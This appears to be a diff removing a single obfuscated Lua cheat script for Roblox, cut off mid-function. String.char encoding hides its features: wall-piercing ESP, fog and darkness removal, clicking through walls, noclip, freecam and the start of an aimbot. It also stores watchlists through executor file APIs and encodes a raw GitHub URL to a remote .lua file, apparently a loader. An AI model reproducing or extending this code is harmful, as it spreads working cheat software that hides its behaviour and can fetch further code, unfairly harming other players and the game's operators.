@@ -1,1 +1,2387 @@
-local _a=game:GetService(string.char(80,108,97,121,101,114,115))local _b=game:GetService(string.char(82,117,110,83,101,114,118,105,99,101))local _c=game:GetService(string.char(85,115,101,114,73,110,112,117,116,83,101,114,118,105,99,101))local _d=game:GetService(string.char(87,111,114,107,115,112,97,99,101))local _e=game:GetService(string.char(76,105,103,104,116,105,110,103))local _f=game:GetService(string.char(67,111,110,116,101,120,116,65,99,116,105,111,110,83,101,114,118,105,99,101))local _g=game:GetService(string.char(82,101,112,108,105,99,97,116,101,100,83,116,111,114,97,103,101))local _h=_a._h local _i=type(getgenv)==string.char(102,117,110,99,116,105,111,110)and getgenv()or _G if _i.__TownEspCleanup then pcall(_i.__TownEspCleanup)end local _j=Enum.KeyCode.RightShift local _k=string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,115,97,110,100,119,105,99,104,109,109,47,105,103,110,111,114,101,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,107,55,81,109,50,120,82,57,118,84,52,112,76,56,119,90,51,110,66,54,46,108,117,97)local _l=Color3.new(1,1,1)local _m={esp=true,_ea=true,skeleton=true,_E=true,tracers=false,_Wf=true,day=false,nodark=false,nofog=false,killlog=true,loadoutspawn=false,wallclick=false,noclip=false,_C=true,viscolor=true,_Qa=true,freecam=false,_nh=false,aimbot=false,aimtoggle=false,aimgun=false,aimwall=true,aimteam=false,aimsafe=true,aimcircle=true,aimoffset=false,wallbang=false,spy=false,aimtracer=false,}local _n=14 local _o local _p={}local _q={}local _r={{string.char(72,101,97,100),string.char(85,112,112,101,114,84,111,114,115,111)},{string.char(85,112,112,101,114,84,111,114,115,111),string.char(76,111,119,101,114,84,111,114,115,111)},{string.char(85,112,112,101,114,84,111,114,115,111),string.char(76,101,102,116,85,112,112,101,114,65,114,109)},{string.char(76,101,102,116,85,112,112,101,114,65,114,109),string.char(76,101,102,116,76,111,119,101,114,65,114,109)},{string.char(76,101,102,116,76,111,119,101,114,65,114,109),string.char(76,101,102,116,72,97,110,100)},{string.char(85,112,112,101,114,84,111,114,115,111),string.char(82,105,103,104,116,85,112,112,101,114,65,114,109)},{string.char(82,105,103,104,116,85,112,112,101,114,65,114,109),string.char(82,105,103,104,116,76,111,119,101,114,65,114,109)},{string.char(82,105,103,104,116,76,111,119,101,114,65,114,109),string.char(82,105,103,104,116,72,97,110,100)},{string.char(76,111,119,101,114,84,111,114,115,111),string.char(76,101,102,116,85,112,112,101,114,76,101,103)},{string.char(76,101,102,116,85,112,112,101,114,76,101,103),string.char(76,101,102,116,76,111,119,101,114,76,101,103)},{string.char(76,101,102,116,76,111,119,101,114,76,101,103),string.char(76,101,102,116,70,111,111,116)},{string.char(76,111,119,101,114,84,111,114,115,111),string.char(82,105,103,104,116,85,112,112,101,114,76,101,103)},{string.char(82,105,103,104,116,85,112,112,101,114,76,101,103),string.char(82,105,103,104,116,76,111,119,101,114,76,101,103)},{string.char(82,105,103,104,116,76,111,119,101,114,76,101,103),string.char(82,105,103,104,116,70,111,111,116)},}local _s={{string.char(72,101,97,100),string.char(84,111,114,115,111)},{string.char(84,111,114,115,111),string.char(76,101,102,116,32,65,114,109)},{string.char(84,111,114,115,111),string.char(82,105,103,104,116,32,65,114,109)},{string.char(84,111,114,115,111),string.char(76,101,102,116,32,76,101,103)},{string.char(84,111,114,115,111),string.char(82,105,103,104,116,32,76,101,103)},}local _t=#_r local _u=Color3.fromRGB(255,40,40)local _v=Color3.fromRGB(90,255,120)local _w=Color3.fromRGB(255,130,40)local _x=0.45 local _y=1 local _z=Color3.fromRGB(70,255,100)local _A=Color3.fromRGB(255,50,50)local _B=string.char(84,111,119,110,69,115,112,87,97,116,99,104,108,105,115,116,46,116,120,116)local _C={}local function _D()if type(writefile)~=string.char(102,117,110,99,116,105,111,110)then return end local _E={}for _F in pairs(_C)do table.insert(_E,_F)end pcall(writefile,_B,table.concat(_E,string.char(10)))end local function _H()if type(isfile)~=string.char(102,117,110,99,116,105,111,110)or type(readfile)~=string.char(102,117,110,99,116,105,111,110)then return end local _I,_J=pcall(function()return isfile(_B)and readfile(_B)or""end)if not _I then return end for _K in string.gmatch(_J,string.char(91,94,13,10,93,43))do _C[_K:lower()]=true end end _H()local function _L(_J)local _M=(_J or""):match(string.char(94,37,115,42,40,46,45,41,37,115,42,36)):lower()if _M==""then return end local _N={}for _O,_P in ipairs(_a:GetPlayers())do if _P.Name:lower():sub(1,#_M)==_M or _P.DisplayName:lower():sub(1,#_M)==_M then table.insert(_N,_P)end end if#_N==1 then _M=_N[1].Name:lower()end _C[_M]=true _D()end local function _Q(_R)return _m._C and(_C[_R.Name:lower()]or _C[_R.DisplayName:lower()])==true end local _S=RaycastParams.new()_S.FilterType=Enum.RaycastFilterType.Exclude _S.RespectCanCollide=true local function _T(_U,_V,_W)local _X={_V}local _Y=_h.Character if _Y then table.insert(_X,_Y)end _S.FilterDescendantsInstances=_X local _Z=_U.CFrame.Position if not _d:Raycast(_Z,_W.Position-_Z,_S)then return true end local _aa=_V:FindFirstChild(string.char(72,101,97,100))if _aa and not _d:Raycast(_Z,_aa.Position-_Z,_S)then return true end return false end local _ba=(type(gethui)==string.char(102,117,110,99,116,105,111,110)and gethui())or _h:WaitForChild(string.char(80,108,97,121,101,114,71,117,105))local _ca=Instance.new(string.char(83,99,114,101,101,110,71,117,105))_ca.Name=string.char(84,111,119,110,69,115,112,79,118,101,114,108,97,121)_ca.ResetOnSpawn=false _ca.IgnoreGuiInset=true _ca.DisplayOrder=1 _ca.Parent=_ba local function _da()local _ea=Instance.new(string.char(70,114,97,109,101))_ea.BackgroundTransparency=1 _ea.BorderSizePixel=0 _ea.Visible=false _ea.Parent=_ca local _fa=Instance.new(string.char(85,73,83,116,114,111,107,101))_fa.Color=_l _fa.Thickness=1 _fa.Parent=_ea local _ga=Instance.new(string.char(84,101,120,116,76,97,98,101,108))_ga.Size=UDim2.fromOffset(200,14)_ga.AnchorPoint=Vector2.new(0.5,1)_ga.BackgroundTransparency=1 _ga.Font=Enum.Font.Code _ga.TextSize=14 _ga.TextColor3=_l _ga.TextStrokeTransparency=0 _ga.Visible=false _ga.Parent=_ca local _ha=Instance.new(string.char(84,101,120,116,76,97,98,101,108))_ha.Size=UDim2.fromOffset(120,14)_ha.AnchorPoint=Vector2.new(0.5,0)_ha.BackgroundTransparency=1 _ha.Font=Enum.Font.Code _ha.TextSize=14 _ha.TextColor3=_v _ha.TextStrokeTransparency=0 _ha.Visible=false _ha.Parent=_ca local _ia=Instance.new(string.char(70,114,97,109,101))_ia.BackgroundColor3=Color3.new(0,0,0)_ia.BackgroundTransparency=0.3 _ia.BorderSizePixel=0 _ia.Visible=false _ia.Parent=_ca local _ja=Instance.new(string.char(70,114,97,109,101))_ja.AnchorPoint=Vector2.new(0,1)_ja.Position=UDim2.fromScale(0,1)_ja.Size=UDim2.fromScale(1,1)_ja.BackgroundColor3=_z _ja.BorderSizePixel=0 _ja.Parent=_ia local _ka=Instance.new(string.char(84,101,120,116,76,97,98,101,108))_ka.Size=UDim2.fromOffset(30,12)_ka.AnchorPoint=Vector2.new(1,0.5)_ka.BackgroundTransparency=1 _ka.Font=Enum.Font.Code _ka.TextSize=12 _ka.TextColor3=_l _ka.TextStrokeTransparency=0 _ka.TextXAlignment=Enum.TextXAlignment.Right _ka.Visible=false _ka.Parent=_ca local _la={}for _ma=1,_t do local _K=Instance.new(string.char(70,114,97,109,101))_K.AnchorPoint=Vector2.new(0.5,0.5)_K.BackgroundColor3=_l _K.BorderSizePixel=0 _K.Visible=false _K.Parent=_ca _la[_ma]=_K end local _na=Instance.new(string.char(70,114,97,109,101))_na.AnchorPoint=Vector2.new(0.5,0.5)_na.BackgroundColor3=_l _na.BorderSizePixel=0 _na.Visible=false _na.Parent=_ca return{_ea=_ea,_fa=_fa,_ga=_ga,_ha=_ha,_la=_la,_na=_na,_ia=_ia,_ja=_ja,_ka=_ka,shown=false,_sa=_l,}end local function _oa(_pa)_pa._ea:Destroy()_pa._ga:Destroy()_pa._ha:Destroy()_pa._na:Destroy()_pa._ia:Destroy()_pa._ka:Destroy()for _O,_K in ipairs(_pa._la)do _K:Destroy()end end local function _qa(_pa)if not _pa.shown then return end _pa.shown=false _pa._ea.Visible=false _pa._ga.Visible=false _pa._ha.Visible=false _pa._na.Visible=false _pa._ia.Visible=false _pa._ka.Visible=false for _O,_K in ipairs(_pa._la)do _K.Visible=false end end local function _ra(_pa,_sa)_pa._sa=_sa _pa._fa.Color=_sa _pa._ga.TextColor3=_sa _pa._na.BackgroundColor3=_sa for _O,_K in ipairs(_pa._la)do _K.BackgroundColor3=_sa end end local function _ta(_K,_ua,_va)local _wa=_va-_ua _K.Size=UDim2.fromOffset(_wa.Magnitude,1)_K.Position=UDim2.fromOffset((_ua.X+_va.X)/2,(_ua.Y+_va.Y)/2)_K.Rotation=math.deg(math.atan2(_wa.Y,_wa.X))_K.Visible=true end local function _xa()local _U=_d.CurrentCamera if not _U then return end for _R,_pa in pairs(_p)do local _V=_R.Character local _W=_V and _V:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))local _ya=_V and _V:FindFirstChildOfClass(string.char(72,117,109,97,110,111,105,100))local _za,_Aa if _m.esp and _W and _ya and _ya.Health>_y then _za,_Aa=_U:WorldToViewportPoint(_W.Position)end if not _Aa then _qa(_pa)else _pa.shown=true local _Ba=_Q(_R)and _u or _l local _Ca=not _m.viscolor or _T(_U,_V,_W)local _sa=_Ca and _Ba or _Ba:Lerp(Color3.new(0,0,0),_x)if _pa._sa~=_sa then _ra(_pa,_sa)end local _I,_Da,_Ea=pcall(_V.GetBoundingBox,_V)local _Fa=_I and _Da.Position or _W.Position local _Ga=_I and _Ea.Y/2 or 3 local _Ha=_U:WorldToViewportPoint(_Fa+Vector3.new(0,_Ga,0))local _Ia=_U:WorldToViewportPoint(_Fa-Vector3.new(0,_Ga,0))local _Ja=math.abs(_Ia.Y-_Ha.Y)local _Ka=_Ja*0.55 _pa._ea.Visible=_m._ea and _Ha.Z>0 and _Ia.Z>0 if _pa._ea.Visible then _pa._ea.Position=UDim2.fromOffset(_za.X-_Ka/2,_Ha.Y)_pa._ea.Size=UDim2.fromOffset(_Ka,_Ja)end local _La=_m._Wf and _Ha.Z>0 and _Ia.Z>0 _pa._ia.Visible=_La _pa._ka.Visible=_La if _La then local _Ma=math._Ag(_ya.MaxHealth,1)local _Na=math.clamp(_ya.Health/_Ma,0,1)local _Oa=_za.X-_Ka/2-6 _pa._ia.Position=UDim2.fromOffset(_Oa,_Ha.Y)_pa._ia.Size=UDim2.fromOffset(3,_Ja)_pa._ja.Size=UDim2.fromScale(1,_Na)_pa._ja.BackgroundColor3=_A:Lerp(_z,_Na)_pa._ka.Text=tostring(math.ceil(_ya.Health))_pa._ka.Position=UDim2.fromOffset(_Oa-2,_Ha.Y+_Ja*(1-_Na))end if _m.tracers and _Ia.Z>0 then local _Pa=_U.ViewportSize _ta(_pa._na,Vector2.new(_Pa.X/2,_Pa.Y),Vector2.new(_za.X,_Ia.Y))else _pa._na.Visible=false end _pa._ha.Visible=_m._Qa and _Ia.Z>0 if _pa._ha.Visible then local _Qa=_V:FindFirstChildOfClass(string.char(70,111,114,99,101,70,105,101,108,100))~=nil local _Ra=_Qa and _v or _w _pa._ha.Text=_Qa andstring.char(83,65,70,69)orstring.char(85,78,83,65,70,69)_pa._ha.TextColor3=_Ca and _Ra or _Ra:Lerp(Color3.new(0,0,0),_x)_pa._ha.Position=UDim2.fromOffset(_za.X,_Ia.Y+2)end _pa._ga.Visible=_m._E if _m._E then local _Sa=math._eb((_U.CFrame.Position-_W.Position).Magnitude)_pa._ga.Text=_R.Name..string.char(32,91).._Sa..string.char(93)_pa._ga.Position=UDim2.fromOffset(_za.X,_Ha.Y-2)end local _Ta=_V:FindFirstChild(string.char(85,112,112,101,114,84,111,114,115,111))and _r or _s for _ma=1,_t do local _K=_pa._la[_ma]local _Ua=_m.skeleton and _Ta[_ma]local _Va=_Ua and _V:FindFirstChild(_Ua[1])local _Wa=_Ua and _V:FindFirstChild(_Ua[2])if _Va and _Wa then local _ua=_U:WorldToViewportPoint(_Va.Position)local _va=_U:WorldToViewportPoint(_Wa.Position)if _ua.Z>0 and _va.Z>0 then _ta(_K,Vector2.new(_ua.X,_ua.Y),Vector2.new(_va.X,_va.Y))else _K.Visible=false end else _K.Visible=false end end end end end local function _Xa(_R)if _R==_h or _p[_R]then return end _p[_R]=_da()end local function _Ya(_R)local _pa=_p[_R]if not _pa then return end _p[_R]=nil _oa(_pa)end for _O,_R in ipairs(_a:GetPlayers())do _Xa(_R)end table.insert(_q,_a.PlayerAdded:Connect(_Xa))table.insert(_q,_a.PlayerRemoving:Connect(_Ya))table.insert(_q,_b.RenderStepped:Connect(_xa))table.insert(_q,_b.Heartbeat:Connect(function()if _m.day and _e.ClockTime~=_n then _e.ClockTime=_n end end))local _Za={{_F=string.char(76,111,119),_hb=90,exposure=0},{_F=string.char(77,101,100),_hb=140,exposure=0.25},{_F=string.char(72,105,103,104),_hb=190,exposure=0.5},}local _ab=2 local _bb local function _cb(_db,_eb)return Color3.new(math._Ag(_db.R,_eb.R),math._Ag(_db.G,_eb.G),math._Ag(_db.B,_eb.B))end local function _fb()if not _m.nodark then return end local _gb=_Za[_ab]local _eb=Color3.fromRGB(_gb._hb,_gb._hb,_gb._hb)local _hb=_cb(_e.Ambient,_eb)if _hb~=_e.Ambient then _e.Ambient=_hb end local _ib=_cb(_e.OutdoorAmbient,_eb)if _ib~=_e.OutdoorAmbient then _e.OutdoorAmbient=_ib end if _e.ExposureCompensation<_gb.exposure then _e.ExposureCompensation=_gb.exposure end end local function _jb()if not _bb then return end _e.Ambient=_bb._hb _e.OutdoorAmbient=_bb._ib _e.ExposureCompensation=_bb.exposure _bb=nil end table.insert(_q,_b.RenderStepped:Connect(_fb))table.insert(_q,_b.Heartbeat:Connect(_fb))for _O,_kb in ipairs({string.char(65,109,98,105,101,110,116),string.char(79,117,116,100,111,111,114,65,109,98,105,101,110,116),string.char(69,120,112,111,115,117,114,101,67,111,109,112,101,110,115,97,116,105,111,110)})do table.insert(_q,_e:GetPropertyChangedSignal(_kb):Connect(_fb))end pcall(function()_b:BindToRenderStep(string.char(84,111,119,110,69,115,112,78,111,68,97,114,107),Enum.RenderPriority.Last.Value+1,_fb)end)local _lb=1e6 local _mb local _nb={}local _ob={}local function _pb(_qb)if not _ob[_qb]then _ob[_qb]={density=_qb.Density,haze=_qb.Haze}end end local function _rb()if not _m.nofog then return end if _e.FogEnd~=_lb then _e.FogEnd=_lb end if _e.FogStart~=_lb then _e.FogStart=_lb end for _qb in pairs(_nb)do if _qb.Parent then _pb(_qb)if _qb.Density~=0 then _qb.Density=0 end if _qb.Haze~=0 then _qb.Haze=0 end else _nb[_qb]=nil end end end local function _sb()if _mb then _e.FogStart=_mb.fogStart _e.FogEnd=_mb.fogEnd _mb=nil end for _qb,_tb in pairs(_ob)do if _qb.Parent then _qb.Density=_tb.density _qb.Haze=_tb.haze end end _ob={}end local function _ub(_qb)if _nb[_qb]then return end _nb[_qb]=true table.insert(_q,_qb:GetPropertyChangedSignal(string.char(68,101,110,115,105,116,121)):Connect(_rb))table.insert(_q,_qb:GetPropertyChangedSignal(string.char(72,97,122,101)):Connect(_rb))_rb()end for _O,_vb in ipairs(_e:GetDescendants())do if _vb:IsA(string.char(65,116,109,111,115,112,104,101,114,101))then _ub(_vb)end end table.insert(_q,_e.DescendantAdded:Connect(function(_vb)if _vb:IsA(string.char(65,116,109,111,115,112,104,101,114,101))then _ub(_vb)end end))table.insert(_q,_b.RenderStepped:Connect(_rb))table.insert(_q,_b.Heartbeat:Connect(_rb))table.insert(_q,_e:GetPropertyChangedSignal(string.char(70,111,103,69,110,100)):Connect(_rb))table.insert(_q,_e:GetPropertyChangedSignal(string.char(70,111,103,83,116,97,114,116)):Connect(_rb))pcall(function()_b:BindToRenderStep(string.char(84,111,119,110,69,115,112,78,111,70,111,103),Enum.RenderPriority.Last.Value+1,_rb)end)local _wb=60 local _xb=32 local _yb={}local _zb={}local _Ab=RaycastParams.new()_Ab.FilterType=Enum.RaycastFilterType.Include local _Bb=true local _Cb=0 local _Db=Instance.new(string.char(72,105,103,104,108,105,103,104,116))_Db.FillColor=_l _Db.FillTransparency=0.7 _Db.OutlineColor=_l _Db.DepthMode=Enum.HighlightDepthMode.AlwaysOnTop _Db.Parent=(type(gethui)==string.char(102,117,110,99,116,105,111,110)and gethui())or _d task.spawn(function()local _Eb=0 for _O,_Fb in ipairs(_d:GetDescendants())do if _Fb:IsA(string.char(67,108,105,99,107,68,101,116,101,99,116,111,114))then _yb[_Fb]=true end _Eb+=1 if _Eb%4000==0 then task.wait()end end _Bb=true end)table.insert(_q,_d.DescendantAdded:Connect(function(_Fb)if _Fb:IsA(string.char(67,108,105,99,107,68,101,116,101,99,116,111,114))then _yb[_Fb]=true;_Bb=true end end))table.insert(_q,_d.DescendantRemoving:Connect(function(_Fb)if _yb[_Fb]then _yb[_Fb]=nil;_Bb=true end end))local function _Gb()_Bb=false _zb={}local _Hb={}for _Ib in pairs(_yb)do local _Jb=_Ib.Parent if _Jb and _Jb:IsDescendantOf(_d)then if not _Hb[_Jb]then _Hb[_Jb]=true table.insert(_zb,_Jb)end else _yb[_Ib]=nil end end _Ab.FilterDescendantsInstances=_zb end local function _Kb(_U)local _Lb=_c:GetMouseLocation()return _U:ViewportPointToRay(_Lb.X,_Lb.Y)end local function _Mb()local _U=_d.CurrentCamera if not _U then return end if _Bb then _Gb()end if#_zb==0 then return end local _Nb=_Kb(_U)local _Ob=_d:Raycast(_Nb.Origin,_Nb.Direction*_wb,_Ab)if not _Ob then return end local _Pb=_Ob.Instance while _Pb and _Pb~=_d do local _Ib=_Pb:FindFirstChildOfClass(string.char(67,108,105,99,107,68,101,116,101,99,116,111,114))if _Ib then return _Ib,_Ob end _Pb=_Pb.Parent end end local function _Qb(_Ib,_Ob)local _U=_d.CurrentCamera local _V=_h.Character local _Rb=RaycastParams.new()_Rb.FilterType=Enum.RaycastFilterType.Exclude _Rb.FilterDescendantsInstances=_V and{_V}or{}local _Nb=_Kb(_U)local _Sb=_d:Raycast(_Nb.Origin,_Nb.Direction*_wb,_Rb)if not _Sb or not(_Sb.Instance==_Ib.Parent or _Sb.Instance:IsDescendantOf(_Ib.Parent))then return false end local _W=_V and _V:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))local _Tb=_Ib.MaxActivationDistance if _Tb<=0 then _Tb=_xb end return _W~=nil and(_W.Position-_Ob.Position).Magnitude<=_Tb end table.insert(_q,_b.RenderStepped:Connect(function()if not _m.wallclick then _Db.Adornee=nil return end local _Ib=_Mb()local _Ub=_Ib and _Ib.Parent _Db.Adornee=(_Ub and _Ub:IsA(string.char(80,86,73,110,115,116,97,110,99,101)))and _Ub or nil end))table.insert(_q,_c.InputBegan:Connect(function(_Vb,_Wb)if _Wb or not _m.wallclick then return end if _Vb.UserInputType~=Enum.UserInputType.MouseButton1 then return end if os.clock()-_Cb<0.2 then return end local _Ib,_Ob=_Mb()if not _Ib or _Qb(_Ib,_Ob)then return end _Cb=os.clock()pcall(fireclickdetector,_Ib)end))local _Xb={}local _Yb=0 local function _Zb()for _ac,_tb in pairs(_Xb)do if _ac.Parent then _ac.CanCollide=_tb.canCollide _ac.Transparency=_tb.transparency end end _Xb={}end local function _bc(_U)local _X={}local _V=_h.Character if _V then table.insert(_X,_V)end local _Rb=RaycastParams.new()_Rb.FilterType=Enum.RaycastFilterType.Exclude local _Lb=_c:GetMouseLocation()local _Nb=_U:ViewportPointToRay(_Lb.X,_Lb.Y)for _O=1,12 do _Rb.FilterDescendantsInstances=_X local _Ob=_d:Raycast(_Nb.Origin,_Nb.Direction*500,_Rb)if not _Ob then return nil end local _ac=_Ob.Instance if _ac:IsA(string.char(84,101,114,114,97,105,110))or not _ac:IsA(string.char(66,97,115,101,80,97,114,116))then return nil end local _cc=_ac:FindFirstAncestorOfClass(string.char(77,111,100,101,108))local _dc=_cc and _a:GetPlayerFromCharacter(_cc)if _dc or(not _ac.CanCollide and not _Xb[_ac])then table.insert(_X,_ac)else return _ac end end end table.insert(_q,_c.InputBegan:Connect(function(_Vb,_Wb)if _Wb or not _m.noclip then return end if _Vb.UserInputType~=Enum.UserInputType.MouseButton1 then return end if os.clock()-_Yb<0.15 then return end local _U=_d.CurrentCamera if not _U then return end local _ac=_bc(_U)if not _ac then return end _Yb=os.clock()local _ec=_Xb[_ac]if _ec then _ac.CanCollide=_ec.canCollide _ac.Transparency=_ec.transparency _Xb[_ac]=nil else _Xb[_ac]={canCollide=_ac.CanCollide,transparency=_ac.Transparency}_ac.CanCollide=false _ac.Transparency=0.5 end end))local _fc=Enum.KeyCode.P local _gc=string.char(84,111,119,110,69,115,112,70,114,101,101,99,97,109,83,105,110,107)local _hc=0.004 local _ic={position=Vector3.new(),pitch=0,yaw=0,speed=32,looking=false,_ec=nil,conns={}}local _jc local function _kc()if not _m.freecam then return end local _U=_d.CurrentCamera if not _U then return end if _U.CameraType~=Enum.CameraType.Scriptable then _U.CameraType=Enum.CameraType.Scriptable end local _Da=CFrame.new(_ic.position)*CFrame.fromOrientation(_ic.pitch,_ic.yaw,0)if _U.CFrame~=_Da then _U.CFrame=_Da end end local function _lc(_mc)if not _m.freecam then return end if not _c:GetFocusedTextBox()then local function _nc(_oc)return _c:IsKeyDown(_oc)and 1 or 0 end local _pc=_nc(Enum.KeyCode.D)-_nc(Enum.KeyCode.A)local _qc=_nc(Enum.KeyCode.S)-_nc(Enum.KeyCode.W)local _rc=math._Ag(_nc(Enum.KeyCode.E),_nc(Enum.KeyCode.Space))-math._Ag(_nc(Enum.KeyCode.Q),_nc(Enum.KeyCode.LeftControl))local _sc=CFrame.fromOrientation(_ic.pitch,_ic.yaw,0)local _tc=_sc:VectorToWorldSpace(Vector3.new(_pc,0,_qc))+Vector3.new(0,_rc,0)if _tc.Magnitude>0 then local _uc=(_c:IsKeyDown(Enum.KeyCode.LeftShift)or _c:IsKeyDown(Enum.KeyCode.RightShift))and 4 or 1 _ic.position=_ic.position+_tc.Unit*_ic.speed*_uc*_mc end end _kc()end local function _vc(_wc)local _U=_d.CurrentCamera if _wc then if not _U then _m.freecam=false return end _ic._ec={cameraType=_U.CameraType,subject=_U.CameraSubject}local _xc,_yc=_U.CFrame:ToOrientation()_ic.position,_ic.pitch,_ic.yaw=_U.CFrame.Position,_xc,_yc _U.CameraType=Enum.CameraType.Scriptable _f:BindActionAtPriority(_gc,function()return Enum.ContextActionResult.Sink end,false,Enum.ContextActionPriority.High.Value,Enum.KeyCode.W,Enum.KeyCode.A,Enum.KeyCode.S,Enum.KeyCode.D,Enum.KeyCode.Q,Enum.KeyCode.E,Enum.KeyCode.Space,Enum.KeyCode.LeftControl)_ic.conns={_U:GetPropertyChangedSignal(string.char(67,70,114,97,109,101)):Connect(_kc),_U:GetPropertyChangedSignal(string.char(67,97,109,101,114,97,84,121,112,101)):Connect(_kc),}else for _O,_zc in ipairs(_ic.conns)do _zc:Disconnect()end _ic.conns={}pcall(function()_f:UnbindAction(_gc)end)if _ic.looking then _ic.looking=false _c.MouseBehavior=Enum.MouseBehavior.Default end if _U and _ic._ec then _U.CameraType=_ic._ec.cameraType if _ic._ec.subject then _U.CameraSubject=_ic._ec.subject end end _ic._ec=nil end end table.insert(_q,_b.RenderStepped:Connect(_kc))pcall(function()_b:BindToRenderStep(string.char(84,111,119,110,69,115,112,70,114,101,101,99,97,109),Enum.RenderPriority.Last.Value+1,_lc)end)table.insert(_q,_c.InputBegan:Connect(function(_Vb,_Wb)if _Wb then return end if _Vb.KeyCode==_fc then _m.freecam=not _m.freecam _vc(_m.freecam)if _jc then _jc()end elseif _m.freecam and _Vb.UserInputType==Enum.UserInputType.MouseButton2 then _ic.looking=true _c.MouseBehavior=Enum.MouseBehavior.LockCurrentPosition end end))table.insert(_q,_c.InputEnded:Connect(function(_Vb)if _Vb.UserInputType==Enum.UserInputType.MouseButton2 and _ic.looking then _ic.looking=false _c.MouseBehavior=Enum.MouseBehavior.Default end end))table.insert(_q,_c.InputChanged:Connect(function(_Vb)if not _m.freecam then return end if _Vb.UserInputType==Enum.UserInputType.MouseMovement and _ic.looking then _ic.yaw=_ic.yaw-_Vb.Delta.X*_hc _ic.pitch=math.clamp(_ic.pitch-_Vb.Delta.Y*_hc,-1.55,1.55)elseif _Vb.UserInputType==Enum.UserInputType.MouseWheel then _ic.speed=math.clamp(_ic.speed*(1.2^_Vb.Position.Z),4,500)end end))local _Ac={string.char(72,101,97,100),string.char(84,111,114,115,111),string.char(82,111,111,116)}local _Bc={string.char(67,70,114,97,109,101),string.char(77,111,117,115,101),string.char(65,98,115,111,108,117,116,101)}local _Cc,_Dc=1,1 local _Ec={string.char(65,117,116,111),string.char(69,110,103,105,110,101),string.char(80,97,114,116,115)}local _Fc=1 local _Gc,_Hc,_Ic=180,0,5 local _Jc local _Kc local _Lc local _Mc,_Nc=0,0 local _Oc={running=false,locked=nil,savedSensitivity=nil}local _Pc=Instance.new(string.char(70,114,97,109,101))_Pc.AnchorPoint=Vector2.new(0.5,0.5)_Pc.BackgroundTransparency=1 _Pc.BorderSizePixel=0 _Pc.Visible=false _Pc.Parent=_ca Instance.new(string.char(85,73,67,111,114,110,101,114),_Pc).CornerRadius=UDim.new(1,0)local _Qc=Instance.new(string.char(85,73,83,116,114,111,107,101))_Qc.Color=_l _Qc.Thickness=1 _Qc.Transparency=0.2 _Qc.Parent=_Pc local _Rc=Color3.fromRGB(255,150,150)local _Sc={string.char(66,111,116,116,111,109),string.char(67,101,110,116,101,114),string.char(77,111,117,115,101)}local _Tc=3 local _Uc=Color3.fromRGB(150,150,255)local _Vc=Instance.new(string.char(70,114,97,109,101))_Vc.AnchorPoint=Vector2.new(0.5,0.5)_Vc.BackgroundColor3=_Uc _Vc.BackgroundTransparency=0.5 _Vc.BorderSizePixel=0 _Vc.Visible=false _Vc.Parent=_ca local _Wc=string.char(76,97,114,112,119,97,114,101,65,105,109,66,108,97,99,107,108,105,115,116,46,116,120,116)local _Xc={}local function _Yc()if type(writefile)~=string.char(102,117,110,99,116,105,111,110)then return end local _E={}for _F in pairs(_Xc)do table.insert(_E,_F)end pcall(writefile,_Wc,table.concat(_E,string.char(10)))end local function _Zc()if type(isfile)~=string.char(102,117,110,99,116,105,111,110)or type(readfile)~=string.char(102,117,110,99,116,105,111,110)then return end local _I,_J=pcall(function()return isfile(_Wc)and readfile(_Wc)or""end)if not _I then return end for _K in string.gmatch(_J,string.char(91,94,13,10,93,43))do _Xc[_K:lower()]=true end end _Zc()local function _ad(_J)local _M=(_J or""):match(string.char(94,37,115,42,40,46,45,41,37,115,42,36)):lower()if _M==""then return end local _N={}for _O,_P in ipairs(_a:GetPlayers())do if _P.Name:lower():sub(1,#_M)==_M or _P.DisplayName:lower():sub(1,#_M)==_M then table.insert(_N,_P)end end if#_N==1 then _M=_N[1].Name:lower()end _Xc[_M]=true _Yc()end local function _bd(_R)return _Xc[_R.Name:lower()]==true or _Xc[_R.DisplayName:lower()]==true end local function _cd(_V)local _dd=_Ac[_Cc]if _dd==string.char(72,101,97,100)then return _V:FindFirstChild(string.char(72,101,97,100))end if _dd==string.char(82,111,111,116)then return _V:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))end return _V:FindFirstChild(string.char(85,112,112,101,114,84,111,114,115,111))or _V:FindFirstChild(string.char(84,111,114,115,111))or _V:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))end local function _ed(_U)if _c.MouseBehavior==Enum.MouseBehavior.LockCenter then return _U.ViewportSize/2 end return _c:GetMouseLocation()end local _fd=RaycastParams.new()_fd.FilterType=Enum.RaycastFilterType.Exclude _fd.IgnoreWater=true local function _gd(_hd)if _hd:IsA(string.char(84,101,114,114,97,105,110))then return true end if _hd.Transparency>=1 or not _hd.CanCollide then return false end if _hd.Material==Enum.Material.Glass then return false end if _hd:FindFirstAncestorOfClass(string.char(84,111,111,108))then return false end local _cc=_hd:FindFirstAncestorOfClass(string.char(77,111,100,101,108))if _cc and _a:GetPlayerFromCharacter(_cc)then return false end return true end local function _id(_U,_V,_ac)local _Z=_U.CFrame.Position local _X={_V}local _Y=_h.Character if _Y then table.insert(_X,_Y)end for _O=1,15 do _fd.FilterDescendantsInstances=_X local _Ob=_d:Raycast(_Z,_ac.Position-_Z,_fd)if not _Ob then return false end if _gd(_Ob.Instance)then return true end table.insert(_X,_Ob.Instance)end return false end local function _jd(_R,_U)if _R==_h then return nil end if _bd(_R)then return nil end local _V=_R.Character local _ya=_V and _V:FindFirstChildOfClass(string.char(72,117,109,97,110,111,105,100))local _ac=_V and _cd(_V)if not(_ac and _ya)then return nil end if _ya.Health<=_y then return nil end if _m.aimteam and _R.Team~=nil and _R.Team==_h.Team then return nil end if _m.aimsafe and _V:FindFirstChildOfClass(string.char(70,111,114,99,101,70,105,101,108,100))then return nil end if _m.aimwall and _id(_U,_V,_ac)then return nil end return _ac end local function _kd(_U,_ac)local _ld,_Aa=_U:WorldToViewportPoint(_ac.Position)if not _Aa then return nil end return(Vector2.new(_ld.X,_ld.Y)-_ed(_U)).Magnitude end local function _md(_U)local _nd,_od,_pd=nil,nil,_Gc for _O,_R in ipairs(_a:GetPlayers())do local _V=_R~=_h and _R.Character local _ac=_V and _cd(_V)if _ac then local _Sa=_kd(_U,_ac)if _Sa and _Sa<_pd then local _qd=_jd(_R,_U)if _qd then 